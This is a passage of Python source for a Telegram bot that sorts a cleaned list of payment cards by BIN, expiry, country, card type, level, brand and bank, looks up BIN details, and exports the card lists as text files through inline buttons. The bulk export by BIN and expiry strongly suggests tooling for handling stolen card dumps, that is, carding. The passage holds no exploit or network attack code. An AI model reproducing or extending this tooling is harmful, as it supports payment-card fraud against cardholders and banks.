            InlineKeyboardButton(f"🔢 BINs ({stats['bins_found']})", callback_data=f"c_cat:b:0:{session_id}"),
            InlineKeyboardButton(f"📅 Expiry ({stats['years_found']} yrs)", callback_data=f"c_cat:e:0:{session_id}")
        ])
        
        # Row 2: Countries and Types (lazy-load)
        keyboard.append([
            InlineKeyboardButton("🌍 Countries", callback_data=f"c_cat:co:0:{session_id}"),
            InlineKeyboardButton("💳 Types", callback_data=f"c_cat:t:0:{session_id}")
        ])
        
        # Row 3: Levels and Brands (lazy-load)
        keyboard.append([
            InlineKeyboardButton("⭐ Levels", callback_data=f"c_cat:l:0:{session_id}"),
            InlineKeyboardButton("🏦 Brands", callback_data=f"c_cat:br:0:{session_id}")
        ])
        
        # Row 4: All Cards and Clear
        keyboard.append([
            InlineKeyboardButton(f"📋 All Cards ({total_found})", callback_data=f"c_cat:a:0:{session_id}"),
            InlineKeyboardButton("🗑️ Clear", callback_data=f"c_clr:{session_id}")
        ])
        
        # Row 5 - Bin Search Button
        keyboard.append([
            InlineKeyboardButton("🔍 Search BIN", callback_data=f"c_bin_search:{session_id}")
        ])
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(stats_text, reply_markup=reply_markup)
        return
    
    # Handle category selection with pagination
    elif data.startswith("c_cat:"):
        parts = data.split(":")
        if len(parts) < 4:
            return
            
        category = parts[1]
        page = int(parts[2])
        session_id = parts[3]
        
        if session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        session_data = context.user_data[session_id]
        
        # Check authorization
        if session_data['user_id'] != user_id and not is_admin(user_id):
            await query.edit_message_text("❌ You are not authorized to view this session.")
            return
        
        organized_data = session_data['organized']
        stats = session_data['stats']
        
        if category == "b":
            await show_bin_category(query, organized_data, session_id, page)
        elif category == "co":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_country_category(query, organized_data, session_id, page)
        elif category == "t":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_type_category(query, organized_data, session_id, page)
        elif category == "l":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_level_category(query, organized_data, session_id, page)
        elif category == "br":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_brand_category(query, organized_data, session_id, page)
        elif category == "e":
            await show_expiry_category(query, organized_data, session_id, page)
        elif category == "a":
            await show_all_cards(query, organized_data, session_id)
        elif category == "bank":
            # Lazy load BIN details if not loaded
            if not organized_data.get('_bin_info_loaded'):
                _load_clean_bin_details(organized_data, stats)
            await show_bank_category(query, organized_data, session_id, page)
    
    # Handle subcategory selection (FIXED: Proper year-month handling)
    elif data.startswith("c_sub:"):
        parts = data.split(":")
        if len(parts) < 5:
            return
        
        category = parts[1]  # Main category (e, ey, ym, etc.)
        sub_type = parts[2]  # Sub type (t, v, ym)
        identifier = parts[3]  # Identifier (year, month, year_month)
        
        # FIXED: Extract session_id correctly based on sub_type
        # For year-month: c_sub:ym:ym:year:month:session_id (6 parts)
        # For others: c_sub:cat:sub:id:session_id (5 parts)
        if sub_type == "ym" and len(parts) >= 6:
            year = identifier
            month = parts[4]
            session_id = parts[5]
        else:
            session_id = parts[4]
            year = None
            month = None
        
        if not session_id or session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        session_data = context.user_data[session_id]
        
        # Check authorization
        if session_data['user_id'] != user_id and not is_admin(user_id):
            await query.edit_message_text("❌ You are not authorized to view this session.")
            return
        
        organized_data = session_data['organized']
        
        # Handle different subcategory types
        if sub_type == "t":
            # Text subcategory (country, type, level, brand, bank)
            if category == "b":
                await show_bin_details(query, organized_data, identifier, session_id)
            elif category == "co":
                await show_country_details(query, organized_data, identifier, session_id)
            elif category == "t":
                await show_type_details(query, organized_data, identifier, session_id)
            elif category == "l":
                await show_level_details(query, organized_data, identifier, session_id)
            elif category == "br":
                await show_brand_details(query, organized_data, identifier, session_id)
            elif category == "bank":
                await show_bank_details(query, organized_data, identifier, session_id)
        elif sub_type == "v":
            # Value subcategory (year, month)
            if category == "ey":
                await show_expiry_year_details(query, organized_data, identifier, session_id)
            elif category == "em":
                await show_expiry_month_details(query, organized_data, identifier, session_id)
        elif sub_type == "ym":
            # Year-month subcategory - already extracted above
            if year and month:
                await show_year_month_details(query, organized_data, year, month, session_id)
            else:
                await query.answer("❌ Invalid year-month format", show_alert=True)
    
    # Handle export requests (FIXED: Proper parsing for year-month) 
    elif data.startswith("c_exp:"):
        parts = data.split(":")
        if len(parts) < 5:
            return
        
        export_type = parts[1]  # 1 or 2
        category = parts[2]  # b, co, t, l, br, bank, ey, em, ym
        sub_type = parts[3]  # t, v, ym
        identifier = parts[4]  # value
        session_id = parts[5] if len(parts) > 5 else None
        
        # FIXED: Handle year-month export specially
        if sub_type == "ym" and category == "ym":
            # Format: c_exp:1:ym:ym:year:month:session_id
            if len(parts) >= 7:
                year = identifier
                month = parts[5]  # month is in position 5
                session_id = parts[6]  # session_id is in position 6
                
                if session_id not in context.user_data:
                    await query.edit_message_text("❌ Session expired. Please run /clean again.")
                    return
                
                session_data = context.user_data[session_id]
                
                # Check authorization
                if session_data['user_id'] != user_id and not is_admin(user_id):
                    await query.edit_message_text("❌ You are not authorized to view this session.")
                    return
                
                organized_data = session_data['organized']
                username = session_data['username']
                
                # Get cards for this year-month
                by_year_month = organized_data['by_year_month']
                cards = []
                try:
                    year_int = int(year)
                    if year_int in by_year_month and month in by_year_month[year_int]:
                        cards = by_year_month[year_int][month]
                except:
                    pass
                
                if not cards:
                    await query.answer("❌ No cards found for export", show_alert=True)
                    return
                
                # Prepare file content
                file_content = ""
                export_category_name = f"{year}_{month}"
                
                if export_type == "1":
                    file_content = "\n".join([card['formatted'] for card in cards])
                else:
                    month_names = {
                        "01": "January", "02": "February", "03": "March", "04": "April",
                        "05": "May", "06": "June", "07": "July", "08": "August",
                        "09": "September", "10": "October", "11": "November", "12": "December"
                    }
                    month_name = month_names.get(month, f"Month {month}")
                    file_content = f"CARDS FOR YEAR-MONTH: {year}-{month_name}\n"
                    file_content += f"Total: {len(cards)} cards\n"
                    file_content += f"Export time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
                    file_content += "="*50 + "\n\n"
                    
                    for card in cards:
                        brand = card.get('brand', '-')
                        country = card.get('country', '-')
                        bank = card.get('bank', '-')
                        file_content += f"{card['formatted']} | {brand} | {country} | {bank}\n"
                
                file_name = f"cards_{year}_{month}_{int(time.time())}.txt"
                caption = f"📁 {len(cards):,} cards (Year-Month: {year}-{month})\n👤 Exported by: {username}"
                
                # Send file
                try:
                    with BytesIO(file_content.encode('utf-8')) as file_buffer:
                        file_buffer.name = file_name
                        
                        await context.bot.send_document(
                            chat_id=query.message.chat.id,
                            document=file_buffer,
                            caption=caption,
                        )
                    
                    await query.answer(f"✅ Exported {len(cards)} cards", show_alert=True)
                except Exception as e:
                    print(f"Export error: {e}")
                    await query.answer("❌ Error exporting file", show_alert=True)
                return
        
        # Regular export handling (non-year-month)
        if not session_id or session_id not in context.user_data:
            await query.edit_message_text("❌ Session expired. Please run /clean again.")
            return
        
        session_data = context.user_data[session_id]
        
        # Check authorization
        if session_data['user_id'] != user_id and not is_admin(user_id):
            await query.edit_message_text("❌ You are not authorized to view this session.")
            return
        
        organized_data = session_data['organized']
        username = session_data['username']
        
        # Get cards for export
        cards = []
        export_category_name = category
        
        if sub_type == "t":
            if category == "b":
                cards = organized_data['by_bin'].get(identifier, [])
                export_category_name = "bin"
            elif category == "co":
                cards = organized_data['by_country'].get(identifier, [])
                export_category_name = "country"
            elif category == "t":
                cards = organized_data['by_type'].get(identifier, [])
                export_category_name = "type"
            elif category == "l":
                cards = organized_data['by_level'].get(identifier, [])
                export_category_name = "level"
            elif category == "br":
                cards = organized_data['by_brand'].get(identifier, [])
                export_category_name = "brand"
            elif category == "bank":
                cards = organized_data['by_bank'].get(identifier, [])
                export_category_name = "bank"
            elif category == "a":
                # All cards export
                cards = organized_data.get('all_cards', organized_data.get('all', []))
                export_category_name = "all_cards"
        elif sub_type == "v":
            if category == "ey":
                try:
                    cards = organized_data['by_expiry_year'].get(int(identifier), [])
                except:
                    cards = []
                export_category_name = "expiry_year"
            elif category == "em":
                cards = organized_data['by_expiry_month'].get(identifier, [])
                export_category_name = "expiry_month"
        
        if not cards:
            await query.answer("❌ No cards found for export", show_alert=True)
            return
        
        # Prepare file content
        file_content = ""
        if export_type == "1":
            file_content = "\n".join([card['formatted'] for card in cards])
            file_name = f"{export_category_name}_{int(time.time())}.txt"
            caption = f"📁 {len(cards):,} cards ({export_category_name}: {identifier[:20]})\n👤 Exported by: {username}"
        else:
            file_content = f"CARDS FOR {export_category_name.upper()}: {identifier[:50]}\n"
            file_content += f"Total: {len(cards)} cards\n"
            file_content += f"Export time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
            file_content += "="*50 + "\n\n"
            
            for card in cards:
                brand = card.get('brand', '-')
                country = card.get('country', '-')
                bank = card.get('bank', '-')
                file_content += f"{card['formatted']} | {brand} | {country} | {bank}\n"
            
            file_name = f"{export_category_name}_{int(time.time())}.txt"
            caption = f"📁 {len(cards):,} cards with details ({export_category_name}: {identifier[:20]})\n👤 Exported by: {username}"
        
        # Send file
        try:
            with BytesIO(file_content.encode('utf-8')) as file_buffer:
                file_buffer.name = file_name
                
                await context.bot.send_document(
                    chat_id=query.message.chat.id,
                    document=file_buffer,
                    caption=caption,
                )
            
            await query.answer(f"✅ Exported {len(cards)} cards", show_alert=True)
        except Exception as e:
            print(f"Export error: {e}")
            await query.answer("❌ Error exporting file", show_alert=True)

# ==== 4.9 Clean Category Display Functions ====
async def show_bin_category(query, organized_data, session_id, page=0):
    """Show BIN category with buttons and pagination"""
    by_bin = organized_data['by_bin']
    
    # Sort bins by count
    bin_items = sorted(by_bin.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 24
    total_pages = (len(bin_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(bin_items))
    
    # Create buttons (2 per row)
    keyboard = []
    row = []
    
    for bin_num, cards in bin_items[start_idx:end_idx]:
        btn_text = f"{bin_num} ({len(cards)})"
        callback_data = f"c_sub:b:t:{bin_num}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:b:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:b:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back and search buttons
    keyboard.append([
        InlineKeyboardButton("🔍 Search BIN", callback_data=f"c_bin_search:{session_id}"),
        InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")
    ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🔢 BIN Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(bin_items)} unique BINs\n"
        f"Showing {start_idx+1}-{end_idx} of {len(bin_items)}\n"
        f"Click a BIN to view cards\n\n"
        f"Use 'Search BIN' to find specific BINs",
        reply_markup=reply_markup
    )

async def show_country_category(query, organized_data, session_id, page=0):
    """Show country category with buttons (WITH FLAGS) and pagination"""
    by_country = organized_data['by_country']
    
    # Sort countries by count
    country_items = sorted(by_country.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 24
    total_pages = (len(country_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(country_items))
    
    # Create buttons (2 per row) with flags
    keyboard = []
    row = []
    
    for country, cards in country_items[start_idx:end_idx]:
        # Get flag for this country
        flag = ""
        if cards:
            flag = cards[0].get('country_flag', '')
        
        # Shorten country name if too long
        country_name = country[:10] + "..." if len(country) > 10 else country
        
        # Create button text with flag
        btn_text = f"{flag} {country_name} ({len(cards)})"
        callback_data = f"c_sub:co:t:{country[:20]}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:co:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:co:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🌍 Country Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(country_items)} countries\n"
        f"Showing {start_idx+1}-{end_idx} of {len(country_items)}\n"
        f"Click a country to view cards",
        reply_markup=reply_markup
    )

async def show_type_category(query, organized_data, session_id, page=0):
    """Show card type category with buttons and pagination"""
    by_type = organized_data['by_type']
    
    # Sort types by count
    type_items = sorted(by_type.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 20
    total_pages = (len(type_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(type_items))
    
    # Create buttons (1 per row)
    keyboard = []
    
    for card_type, cards in type_items[start_idx:end_idx]:
        btn_text = f"{card_type[:15]} ({len(cards)})"
        callback_data = f"c_sub:t:t:{card_type[:20]}:{session_id}"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback_data)])
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:t:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:t:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"💳 Card Type Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(type_items)} card types\n"
        f"Showing {start_idx+1}-{end_idx} of {len(type_items)}\n"
        f"Click a type to view cards",
        reply_markup=reply_markup
    )

async def show_level_category(query, organized_data, session_id, page=0):
    """Show card level category with buttons and pagination"""
    by_level = organized_data['by_level']
    
    # Sort levels by count
    level_items = sorted(by_level.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 20
    total_pages = (len(level_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(level_items))
    
    # Create buttons (1 per row)
    keyboard = []
    
    for level, cards in level_items[start_idx:end_idx]:
        display_level = level if level != "" else "Unknown"
        btn_text = f"{display_level[:15]} ({len(cards)})"
        callback_data = f"c_sub:l:t:{level[:20]}:{session_id}"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback_data)])
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:l:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:l:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"⭐ Card Level Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(level_items)} card levels\n"
        f"Showing {start_idx+1}-{end_idx} of {len(level_items)}\n"
        f"Click a level to view cards",
        reply_markup=reply_markup
    )

async def show_brand_category(query, organized_data, session_id, page=0):
    """Show brand category with buttons and pagination"""
    by_brand = organized_data['by_brand']
    
    # Sort brands by count
    brand_items = sorted(by_brand.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 24
    total_pages = (len(brand_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(brand_items))
    
    # Create buttons (2 per row)
    keyboard = []
    row = []
    
    for brand, cards in brand_items[start_idx:end_idx]:
        btn_text = f"{brand[:10]} ({len(cards)})"
        callback_data = f"c_sub:br:t:{brand[:20]}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:br:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:br:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🏦 Brand Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(brand_items)} brands\n"
        f"Showing {start_idx+1}-{end_idx} of {len(brand_items)}\n"
        f"Click a brand to view cards",
        reply_markup=reply_markup
    )

async def show_expiry_category(query, organized_data, session_id, page=0):
    """Show expiry category with years - FIXED CALLBACK DATA"""
    by_year_month = organized_data['by_year_month']
    
    # Sort years
    year_items = sorted(by_year_month.items(), key=lambda x: x[0])
    
    # Create buttons (2 per row) - FIXED CALLBACK DATA FORMAT
    keyboard = []
    row = []
    
    for year, months in year_items:
        # Count total cards for this year
        year_total = sum(len(cards) for cards in months.values())
        btn_text = f"{year} ({year_total})"
        # FIXED: Correct format for year selection
        callback_data = f"c_sub:ey:v:{year}:{session_id}"
        row.append(InlineKeyboardButton(btn_text, callback_data=callback_data))
        
        if len(row) == 2:
            keyboard.append(row)
            row = []
    
    if row:
        keyboard.append(row)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📅 Expiry Year Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(year_items)} expiry years\n"
        f"Click a year to view months",
        reply_markup=reply_markup
    )

async def show_bank_category(query, organized_data, session_id, page=0):
    """Show bank category with buttons and pagination"""
    by_bank = organized_data['by_bank']
    
    # Sort banks by count
    bank_items = sorted(by_bank.items(), key=lambda x: len(x[1]), reverse=True)
    
    # Calculate pagination
    items_per_page = 20
    total_pages = (len(bank_items) + items_per_page - 1) // items_per_page
    page = max(0, min(page, total_pages - 1))
    
    start_idx = page * items_per_page
    end_idx = min(start_idx + items_per_page, len(bank_items))
    
    # Create buttons (1 per row)
    keyboard = []
    
    for bank, cards in bank_items[start_idx:end_idx]:
        btn_text = f"{bank[:15]} ({len(cards)})"
        callback_data = f"c_sub:bank:t:{bank[:20]}:{session_id}"
        keyboard.append([InlineKeyboardButton(btn_text, callback_data=callback_data)])
    
    # Add pagination buttons if needed
    if total_pages > 1:
        nav_buttons = []
        if page > 0:
            nav_buttons.append(InlineKeyboardButton("⬅️ Previous", callback_data=f"c_cat:bank:{page-1}:{session_id}"))
        nav_buttons.append(InlineKeyboardButton(f"Page {page+1}/{total_pages}", callback_data=f"#"))
        if page < total_pages - 1:
            nav_buttons.append(InlineKeyboardButton("Next ➡️", callback_data=f"c_cat:bank:{page+1}:{session_id}"))
        keyboard.append(nav_buttons)
    
    # Add back button
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🏦 Bank Categories\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Found {len(bank_items)} banks\n"
        f"Showing {start_idx+1}-{end_idx} of {len(bank_items)}\n"
        f"Click a bank to view cards",
        reply_markup=reply_markup
    )

async def show_all_cards(query, organized_data, session_id):
    """Show all cards with export options - FIXED"""
    all_cards = organized_data['all_cards']
    total_cards = len(all_cards)
    
    # Create export buttons (2 per row) - FIXED: Use 'a' as category for 'all'
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:a:t:all:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:a:t:all:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"📋 All Cards\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Total cards: {total_cards:,}\n\n"
        f"📁 Export Options\n"
        f"• 📄 Get TXT - Download all cards as text file\n"
        f"• 📄+🗑️ TXT & Remove - Download and mark as exported",
        reply_markup=reply_markup
    )

async def show_bin_details(query, organized_data, bin_num, session_id):
    """Show details for a specific BIN"""
    cards = organized_data['by_bin'].get(bin_num, [])
    
    if not cards:
        await query.answer("❌ No cards found for this BIN", show_alert=True)
        return
    
    # Get sample card for BIN info
    sample_card = cards[0]
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:b:t:{bin_num}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:b:t:{bin_num}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to BINs", callback_data=f"c_cat:b:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # Get BIN info if not loaded
    bin_info = sample_card.get('bin_info', '')
    brand = sample_card.get('brand', 'Unknown')
    card_type = sample_card.get('type', 'Unknown')
    country = sample_card.get('country', 'Unknown')
    country_flag = sample_card.get('country_flag', '')
    bank = sample_card.get('bank', 'Unknown')
    level = sample_card.get('level', '')
    
    # If BIN info not loaded, try to get it
    if not bin_info or brand == 'Unknown':
        try:
            bin_info, details = get_bin_info(bin_num)
            brand = details.get('brand', 'Unknown')
            card_type = details.get('type', 'Unknown')
            country = details.get('country', 'Unknown')
            country_flag = details.get('country_flag', '')
            bank = details.get('bank', 'Unknown')
            level = details.get('level', '')
        except:
            pass
    
    await query.edit_message_text(
        f"🔢 BIN Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"BIN: {bin_num}\n"
        f"Info: {bin_info}{(' ' + country_flag) if country_flag else ''}\n"
        f"Brand: {brand}\n"
        f"Type: {card_type}\n"
        f"Country: {country_flag} {country}\n"
        f"Bank: {bank}\n"
        f"Level: {level or 'N/A'}\n\n"
        f"📊 Cards found: {len(cards):,}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_country_details(query, organized_data, country, session_id):
    """Show details for a specific country (WITH FLAG)"""
    cards = organized_data['by_country'].get(country, [])
    
    if not cards:
        await query.answer("❌ No cards found for this country", show_alert=True)
        return
    
    # Get flag for country
    flag = ""
    if cards:
        flag = cards[0].get('country_flag', '')
    
    # Count unique BINs in this country
    unique_bins = set(card['bin'] for card in cards)
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:co:t:{country[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:co:t:{country[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Countries", callback_data=f"c_cat:co:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🌍 Country Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Country: {flag} {country}\n"
        f"Total cards: {len(cards):,}\n"
        f"Unique BINs: {len(unique_bins)}\n"
        f"Top BINs: {', '.join(list(unique_bins)[:5])}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_type_details(query, organized_data, card_type, session_id):
    """Show details for a specific card type"""
    cards = organized_data['by_type'].get(card_type, [])
    
    if not cards:
        await query.answer("❌ No cards found for this type", show_alert=True)
        return
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:t:t:{card_type[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:t:t:{card_type[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Types", callback_data=f"c_cat:t:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"💳 Card Type Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Type: {card_type}\n"
        f"Total cards: {len(cards):,}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_level_details(query, organized_data, level, session_id):
    """Show details for a specific card level"""
    cards = organized_data['by_level'].get(level, [])
    display_level = level if level != "" else "Unknown"
    
    if not cards:
        await query.answer("❌ No cards found for this level", show_alert=True)
        return
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:l:t:{level[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:l:t:{level[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Levels", callback_data=f"c_cat:l:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"⭐ Card Level Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Level: {display_level}\n"
        f"Total cards: {len(cards):,}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_brand_details(query, organized_data, brand, session_id):
    """Show details for a specific brand"""
    cards = organized_data['by_brand'].get(brand, [])
    
    if not cards:
        await query.answer("❌ No cards found for this brand", show_alert=True)
        return
    
    # Count unique countries for this brand
    unique_countries = set(card['country'] for card in cards)
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:br:t:{brand[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:br:t:{brand[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back to Brands", callback_data=f"c_cat:br:0:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🏦 Brand Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Brand: {brand}\n"
        f"Total cards: {len(cards):,}\n"
        f"Countries: {len(unique_countries)}\n"
        f"Sample countries: {', '.join(list(unique_countries)[:5])}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

async def show_bank_details(query, organized_data, bank, session_id):
    """Show details for a specific bank"""
    cards = organized_data['by_bank'].get(bank, [])
    
    if not cards:
        await query.answer("❌ No cards found for this bank", show_alert=True)
        return
    
    # Count unique BINs for this bank
    unique_bins = set(card['bin'] for card in cards)
    
    # Create export buttons (2 per row) - FIXED CALLBACK DATA
    keyboard = [
        [
            InlineKeyboardButton("📄 Get TXT", callback_data=f"c_exp:1:bank:t:{bank[:20]}:{session_id}"),
            InlineKeyboardButton("📄+🗑️ TXT & Remove", callback_data=f"c_exp:2:bank:t:{bank[:20]}:{session_id}")
        ],
        [InlineKeyboardButton("⬅️ Back", callback_data=f"c_back:{session_id}")]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        f"🏦 Bank Details\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"Bank: {bank}\n"
        f"Total cards: {len(cards):,}\n"
        f"Unique BINs: {len(unique_bins)}\n\n"
        f"📁 Export Options",
        reply_markup=reply_markup
    )

